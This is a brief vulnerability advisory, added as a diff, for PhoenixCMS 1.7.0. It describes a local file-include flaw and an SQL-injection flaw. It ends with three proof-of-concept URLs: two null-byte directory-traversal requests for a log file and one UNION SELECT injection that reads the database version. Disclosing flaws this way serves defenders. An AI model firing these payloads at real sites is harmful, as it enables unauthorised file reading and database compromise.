@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/47389/info
+
+PhoenixCMS is prone to a local file-include vulnerability and an SQL-injection vulnerability.
+
+An attacker can exploit the local file-include vulnerability using directory-traversal strings to view and execute arbitrary local files within the context of the webserver process.
+
+The attacker can exploit the SQL-injection vulnerability to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+PhoenixCMS 1.7.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/[path]/modules.php?name=Work_Probe&file=../../WS_FTP.LOG%00
+http://www.example.com/[path]/modules.php?name=News&file=../../WS_FTP.LOG%00
+http://www.example.com/modules.php?name=Surveys&op=results&pollID=3+and+1=2+union+select+1,version(),3,4,5-- 
